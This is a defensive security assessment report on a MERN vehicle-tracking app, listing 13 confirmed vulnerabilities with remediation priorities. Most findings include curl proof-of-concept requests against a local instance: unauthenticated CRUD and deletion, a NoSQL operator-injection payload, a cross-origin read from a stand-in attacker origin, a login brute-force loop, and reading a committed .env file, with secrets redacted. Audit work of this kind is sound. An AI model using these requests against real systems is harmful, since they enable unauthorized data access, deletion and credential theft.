# Confirmed Security Vulnerabilities — MERN_Vehicle_Tracking_Fleet_Management

**Assessment date:** 2026-09-21
**Assessed by:** Combined white-box (source review) + black-box (live runtime testing against the local instance) approach.
**Target:** Local instance — server on `http://localhost:3001` (Express/Mongoose), client on `http://localhost:3000` (React/Redux), database `mongodb://127.0.0.1:27017/vehicle_tracking`.
**Scope / rules followed:**
- No production or third-party systems touched. The MongoDB Atlas cluster and Gmail account whose credentials are exposed in `server/.env`/git history belong to the original repo author (`Cengizhnx`), **not** the local tester — they were documented as exposed but never connected to or used.
- All exploit/PoC traffic was run against the local instance only, using disposable test records (created and deleted during testing; the database was returned to its original empty state afterward).
- No source code was modified during this assessment. No `npm audit fix` / `npm update` was run — only the read-only `npm audit` report.
- Secret values below are redacted per standard practice; unredacted evidence exists only in the tester's local session history.

This report supersedes the "Pending" status of hypotheses V1–V7 in `SE4030_EVIDENCE_MATRIX.md` with live-verified evidence, and adds V8–V13 discovered during this pass.

---

## Summary table

| ID | Vulnerability | Severity | OWASP / CWE |
|----|---|---|---|
| V1 | Missing authentication & authorization on all API routes | Critical | OWASP API1/API5 · CWE-306, CWE-862 |
| V2 | Broken object-level authorization (BOLA/IDOR) on update/delete | Critical | OWASP API1 · CWE-639 |
| V3 | Password hash disclosure in API responses and JWT payload | Critical | OWASP API3 · CWE-200, CWE-522 |
| V4 | Hardcoded secrets committed to git / pushed to public GitHub repo | Critical | OWASP A02/A05 · CWE-798, CWE-540 |
| V5 | Wildcard CORS policy stacked on missing auth | High | OWASP A05 · CWE-942 |
| V6 | No brute-force protection / no password policy | High | OWASP A07 · CWE-307, CWE-521 |
| V7 | Verbose error handler leaks stack traces & file paths | Medium | OWASP A05 · CWE-209 |
| V8 | Unvalidated input → type-confusion crash / null-pointer bug | Medium | CWE-20, CWE-476 |
| V9 | User enumeration via distinct login error messages | Medium | OWASP A07 · CWE-204 |
| V10 | Outdated/vulnerable dependencies (23 known CVEs incl. 2 critical) | Medium | OWASP A06 · CWE-1104 |
| V11 | Unauthenticated SMTP relay via `/mail/sendMail` | Medium | CWE-306, CWE-937 |
| V12 | Unescaped HTML interpolation in outbound emails | Medium | CWE-79 (HTML/template injection) |
| V13 | SMTP TLS certificate validation disabled | Medium | CWE-295 |

---

## V1 — Missing authentication & authorization on all API routes
**Severity:** Critical

**Location:**
- `server/index.js:35-39` — routers mounted with zero middleware
- `server/routes/customer.js`, `server/routes/fleet.js`, `server/routes/route.js`, `server/routes/mail.js` — no auth middleware on any route
- `server/controllers/*.js` — no `jwt.verify`, no `Authorization` header check anywhere (confirmed via full-source grep)

**Why it's vulnerable:** Every CRUD endpoint — list/read/create/update/delete customers, fleets, routes, and send email — is reachable by any client with network access to port 3001, with no token of any kind. Client-side route gating (`App.js`: `user.name === "admin" ? ... : <Navigate to="/login" />`) is the *only* access control in the entire application, and it runs in the browser, fully bypassable.

**Reproduction (verified live):**
```bash
curl http://localhost:3001/customer/getAllCustomers
# → 200 OK, full customer list, no Authorization header sent

curl -X POST http://localhost:3001/customer/addCustomer \
  -H "Content-Type: application/json" \
  -d '{"name":"Test User","email":"victim@example.com","phone":"1234567890","password":"S3cretPass!","status":"active"}'
# → 201 Created, no token required

curl -X DELETE http://localhost:3001/customer/deleteCustomer/<any-id>
# → 200 "User deleted !", no token required
```

**Suggested tools:** Burp Suite (Autorize extension) or OWASP ZAP for systematic authorization-matrix testing; Postman/curl for manual proof-of-concept.

---

## V2 — Broken object-level authorization (BOLA/IDOR)
**Severity:** Critical

**Location:** `server/controllers/customer.js:70-98` (`updateStatusCustomer`, `deleteCustomer`), same caller-ID-trusting pattern in `server/controllers/fleet.js` and `server/controllers/route.js`.

**Why it's vulnerable:** `findByIdAndUpdate`/`findByIdAndDelete` operate on whatever `_id`/`:id` the caller supplies, with no check that the caller owns or is authorized to act on that record. Combined with V1 (no auth at all), this becomes full unrestricted cross-account CRUD.

**Reproduction (verified live, disposable test data, cleaned up after):**
```bash
# Created customer A (id=A) and customer B (id=B) with no authentication.

curl -X PUT http://localhost:3001/customer/updateStatusCustomer \
  -H "Content-Type: application/json" -d '{"_id":"<A_ID>","status":"active"}'
# → flips A's status to "passive" with zero session/ownership tied to A

curl -X DELETE http://localhost:3001/customer/deleteCustomer/<B_ID>
# → 200 "User deleted !" — B is permanently deleted using only its Mongo _id
```

**Suggested tools:** Burp Suite Repeater/Autorize, OWASP ZAP.

---

## V3 — Password hash disclosure in API responses and JWT payload
**Severity:** Critical

**Location:**
- `server/controllers/customer.js:38-39` — `res.status(201).json(savedUser)` returns the full Mongoose document
- `server/controllers/customer.js` `getAllCustomers`/`getCustomer` — `Customer.find()` / `findById()` with no `.select('-password')` or schema-level exclusion
- `server/controllers/auth.js:48` and `server/controllers/customer.js:135` — `jwt.sign({ user: user }, process.env.JWT)` with no `expiresIn`

**Why it's vulnerable:** The bcrypt password hash is returned in plaintext JSON on register/create/list/get, and is also embedded in the JWT payload. JWTs are base64-encoded, not encrypted — anyone holding a token (stored unprotected in `localStorage`) can decode it client-side and read the hash for offline cracking. No expiry claim means a leaked token never becomes invalid.

**Reproduction (verified live):**
```bash
curl -X POST http://localhost:3001/customer/addCustomer -H "Content-Type: application/json" \
  -d '{"name":"Test User","email":"victim@example.com","phone":"1234567890","password":"S3cretPass!","status":"active"}'
# → response body includes "password":"$2b$10$[REDACTED_HASH]"

TOKEN=$(curl -s -X POST http://localhost:3001/customer/login -H "Content-Type: application/json" \
  -d '{"email":"victim@example.com","password":"S3cretPass!"}' | ...)
node -e "console.log(Buffer.from('<token-payload-segment>','base64').toString())"
# → {"user":{"_id":"...","name":"...","email":"...","password":"$2b$10$[REDACTED_HASH]", ...}, "iat":...}
# note: no "exp" claim present at all
```

**Suggested tools:** jwt.io / jwt_tool for decoding and claim inspection; hashcat or John the Ripper to demonstrate offline cracking feasibility of a leaked hash.

---

## V4 — Hardcoded secrets committed to git / pushed to a public GitHub repo
**Severity:** Critical

**Location:** `server/.env`, tracked by git. No `.gitignore` entry anywhere in the repository excludes it (root has no `.gitignore`; `server/` has none; only `client/.gitignore` exists and doesn't cover `server/.env`). Remote: `https://github.com/Cengizhnx/MERN_Vehicle_Tracking_Fleet_Management.git`.

**Why it's vulnerable:** `server/.env` is version-controlled across the project's commit history and contains, in the committed `HEAD` revision: a MongoDB Atlas SRV connection string with an embedded username and password, a Gmail address plus its SMTP app password, and the JWT signing secret. Anyone who has ever cloned or viewed this public repository has access to these credentials.

**Reproduction (verified, no live secret use):**
```bash
git ls-files | grep -i env
# → server/.env  (tracked)

git show HEAD:server/.env
# → MONGO_URL='mongodb+srv://[REDACTED_USER]:[REDACTED_PASS]@cluster0.[REDACTED].mongodb.net/'
#    JWT=[REDACTED — 32-char secret]
#    EMAIL_USER=[REDACTED]@gmail.com
#    EMAIL_PASS=[REDACTED — 16-char app password]

git remote -v
# → origin points to a public github.com/Cengizhnx/... repository

git fetch origin && git rev-list --left-right --count HEAD...origin/master
# → 0  0   (local clone is byte-for-byte identical to origin/master — this is exactly
#            what's live on GitHub right now, not a hypothetical or stale local copy)

git ls-tree -r origin/master --name-only | grep -i env
# → server/.env   (present in the CURRENT tip of the public branch, not just old history)

git log --oneline --all -- server/.env
# → 0372594 fix                              (most recent touch)
#    db35b10 send email to customer and route added
#    aed15d7 first commit                     (secrets present since the very first commit)

gh api repos/Cengizhnx/MERN_Vehicle_Tracking_Fleet_Management --jq '{private, pushed_at}'
# → {"private": false, "pushed_at": "2024-02-09T09:07:07Z"}
#    Confirms via the GitHub API (anonymous, read-only) that the repository is PUBLIC
#    and was last pushed 2024-02-09 — the exposure is live right now, not theoretical.
```
**These credentials were not used to connect to any live third-party service** — they belong to the original repository owner, not this environment, and exercising them would be unauthorized access. Given confirmed public exposure, they should be treated by the repo owner as **already compromised** and rotated regardless of any code fix.

**Suggested tools:** `gitleaks` or `trufflehog` run against full git history; GitHub secret scanning; `git log -p -- server/.env` for a manual timeline of exposure.

---

## V5 — Wildcard CORS policy stacked on missing authentication
**Severity:** High

**Location:** `server/index.js:33` — `app.use(cors())`.

**Why it's vulnerable:** The default `cors()` configuration reflects `Access-Control-Allow-Origin: *` for every request regardless of origin. Combined with V1 (no auth on any endpoint), this means any third-party website can script a `fetch()` call from a visitor's browser and read or modify all customer, fleet, and route data — a cross-origin data-exfiltration primitive that requires no vulnerability in the browser at all.

**Reproduction (verified live):**
```bash
curl -i http://localhost:3001/customer/getAllCustomers -H "Origin: https://evil-attacker.example"
# → HTTP/1.1 200 OK
#    Access-Control-Allow-Origin: *
#    ... full customer dataset in body ...
```

**Suggested tools:** Burp Suite's CORS scanner; a minimal hosted HTML page with a `fetch()` PoC, exercised in a real browser via devtools Network tab.

---

## V6 — No brute-force protection / no password policy
**Severity:** High

**Location:** No `express-rate-limit` (or any throttling middleware) anywhere in `server/`; `server/controllers/customer.js:6-18` (`addCustomer`) hashes and stores any password value with no minimum length or complexity check; same absence in `server/controllers/auth.js` `register`.

**Why it's vulnerable:** `/auth/login` and `/customer/login` accept unlimited login attempts with no delay, lockout, or CAPTCHA, enabling unthrottled credential-stuffing/password-guessing. Weak passwords (e.g. a single character) are accepted and hashed without complaint, making guessing attacks cheap.

**Reproduction (verified live):**
```bash
for i in $(seq 1 20); do
  curl -s -o /dev/null -w "%{http_code} " -X POST http://localhost:3001/customer/login \
    -H "Content-Type: application/json" -d '{"email":"victim@example.com","password":"wrongpass"}'
done
# → 400 400 400 400 400 400 400 400 400 400 400 400 400 400 400 400 400 400 400 400
#    (20/20 attempts processed identically — no 429, no increasing delay, no lockout)

curl -X POST http://localhost:3001/customer/addCustomer -H "Content-Type: application/json" \
  -d '{"name":"Weak Pw","email":"weak@example.com","phone":"111","password":"1","status":"active"}'
# → 201 Created  (single-character password accepted)
```

**Suggested tools:** Burp Suite Intruder / Turbo Intruder; THC-Hydra for a scripted credential-stuffing demonstration.

---

## V7 — Verbose error handler leaks stack traces and absolute file paths
**Severity:** Medium

**Location:** `server/index.js` — no centralized Express error-handling middleware (`app.use((err, req, res, next) => {...})`) is ever registered, so every `next(err)` call in every controller falls through to Express's default HTML error handler.

**Why it's vulnerable:** Any thrown error (invalid ObjectId, type mismatch, DB failure) returns a full HTML page containing the raw Node.js/Mongoose stack trace, including absolute server filesystem paths and internal library version details — reconnaissance information handed to an unauthenticated attacker for free.

**Reproduction (verified live):**
```bash
curl http://localhost:3001/customer/getCustomer/not-a-valid-id
# → 500, HTML body:
#    CastError: Cast to ObjectId failed for value "not-a-valid-id" ...
#        at ObjectId.cast (D:\...\server\node_modules\mongoose\lib\schema\objectid.js:248:11)
#        ... full stack with absolute local paths ...
```

**Suggested tools:** OWASP ZAP passive scan (information-disclosure rule); manual curl/Burp Repeater.

---

## V8 — Unvalidated input → type-confusion crash / null-pointer bug
**Severity:** Medium

**Location:**
- `server/controllers/auth.js:31-38` — missing `return` after the "user not found" branch (`res.status(401).json(...)` is sent, but execution continues to `user.status` on a `null` object)
- `server/controllers/customer.js:127` — `bcrypt.compare(req.body.password, user.password)` fed an unvalidated request-body value

**Why it's vulnerable:** Request-body fields are passed directly into Mongoose queries and `bcrypt` calls without type checking. Submitting a JSON object instead of a string (`{"$gt":""}` / `{"$ne":null}`) is accepted by `Customer.findOne()` — a classic MongoDB operator-injection input shape — and then crashes `bcrypt.compare`. Separately, any login attempt against a non-existent email in `/auth/login` throws an unhandled `TypeError` due to the missing early `return`.

**Reproduction (verified live):**
```bash
curl -X POST http://localhost:3001/customer/login -H "Content-Type: application/json" \
  -d '{"email":"victim@example.com","password":{"$ne":null}}'
# → 500, HTML: "Error: data and hash must be strings" at bcrypt.js:215, customer.js:127

curl -X POST http://localhost:3001/auth/login -H "Content-Type: application/json" \
  -d '{"email":"nobody@nowhere.com","password":"x"}'
# server log: TypeError: Cannot read properties of null (reading 'status') at auth.js:35
```

**Suggested tools:** NoSQLMap; Burp Repeater/Intruder with a NoSQL-injection payload list.

---

## V9 — User enumeration via distinct login error messages
**Severity:** Medium

**Location:** `server/controllers/auth.js:31-45`, `server/controllers/customer.js:123-133`.

**Why it's vulnerable:** "No such user" and "wrong password" return distinguishable messages/status codes, letting an attacker enumerate which emails are registered customers.

**Reproduction (verified live):**
```bash
curl -X POST http://localhost:3001/auth/login -d '{"email":"unknown@x.com","password":"x"}'
# → "Böyle bir kullanıcı yok !"   (no such user)

curl -X POST http://localhost:3001/auth/login -d '{"email":"<known-email>","password":"wrong"}'
# → "Hatalı e-mail veya şifre !"  (wrong email or password)
```

**Suggested tools:** Burp Suite Intruder with an email wordlist + response-length/content diffing.

---

## V10 — Outdated/vulnerable dependencies
**Severity:** Medium

**Location:** `server/package.json` — `nodemon` is listed as a **production** dependency (should be dev-only), pulling in a vulnerable `tar`/`simple-update-notifier` chain.

**Reproduction (verified live, read-only):**
```bash
cd server && npm audit
# → 23 vulnerabilities (3 low, 2 moderate, 16 high, 2 critical)
#    incl. critical node-tar arbitrary file write / DoS (GHSA-f5x3-32g6-xq36 and related advisories)
```

**Suggested tools:** `npm audit`, Snyk, OWASP Dependency-Check, GitHub Dependabot.

---

## V11 — Unauthenticated SMTP relay via `/mail/sendMail`
**Severity:** Medium (source-confirmed; not fired against the live Gmail account to avoid using real third-party credentials)

**Location:** `server/routes/mail.js` (no middleware), `server/controllers/mail.js` — `email` from the request body becomes both the `to` and `replyTo` header on an outgoing message sent through the organization's Gmail account.

**Why it's vulnerable:** Any unauthenticated caller can make the server send an email, to any recipient address, using the site's Gmail sender identity — an open-relay-style abuse primitive (spam/phishing infrastructure riding on the app's SMTP credentials).

**Recommended verification (not yet executed):** Point `EMAIL_HOST`/credentials at a local Mailpit/MailHog instance instead of the real Gmail account, then submit a minimal `POST /mail/sendMail` with no `Authorization` header and confirm delivery to an arbitrary recipient captured by the local mail sink.

**Suggested tools:** Mailpit or MailHog as a safe SMTP sink; Burp Suite/curl to fire the request.

---

## V12 — Unescaped HTML interpolation in outbound emails
**Severity:** Medium (source-confirmed; not fired live for the same reason as V11)

**Location:** `server/controllers/mail.js` — `emailTemplate()`/`fleetTemplate()` interpolate `name`, `route.starting`, `route.destination`, `car.*`, `driver.*` directly into a raw HTML string with no escaping.

**Why it's vulnerable:** Any value stored via the unauthenticated create endpoints (customer name, route/car/driver fields — see V1) flows unescaped into an HTML email body, allowing HTML/markup injection into outbound mail (e.g., spoofed links, broken rendering, phishing content) once V11 or the normal create flow is used to seed attacker-controlled strings.

**Recommended verification:** Using the Mailpit/MailHog setup from V11, create a route/customer with a name containing a harmless marker (e.g. `<b>SE4030-TEST</b>`) and inspect the raw captured MIME to confirm it renders unescaped.

**Suggested tools:** Mailpit/MailHog, manual HTML inspection of captured mail.

---

## V13 — SMTP TLS certificate validation disabled
**Severity:** Medium (source-confirmed)

**Location:** `server/utils/sendEmail.js:11-13` — `tls: { rejectUnauthorized: false }`.

**Why it's vulnerable:** Disabling certificate validation on the SMTP connection allows a network-position attacker to man-in-the-middle the outbound mail connection (e.g., on a hostile network or via DNS/route manipulation) without the client detecting an invalid certificate, potentially exposing the Gmail app password during the SMTP handshake or allowing message tampering.

**Recommended verification:** Point the SMTP transport at a local test server presenting a self-signed/invalid certificate and confirm the connection still succeeds instead of failing closed.

**Suggested tools:** A local test SMTP server with a deliberately invalid cert (e.g., `smtp-tester`, or `openssl s_server`), Wireshark to observe the handshake.

---

## Notes on remediation ordering
Recommended fix priority given blast radius and effort: **V1 → V2** (add auth/role middleware — this single fix eliminates or drastically reduces the practical exploitability of V2, and partially mitigates V5's impact) → **V4** (rotate all leaked secrets immediately, regardless of code fixes, since they may already be public) → **V3** (strip password from responses/JWT claims, add `expiresIn`) → **V5, V6** → **V7, V8, V9** → **V10, V11, V12, V13**.

No fixes have been applied yet — this file is the confirmed-findings baseline for review before remediation begins.
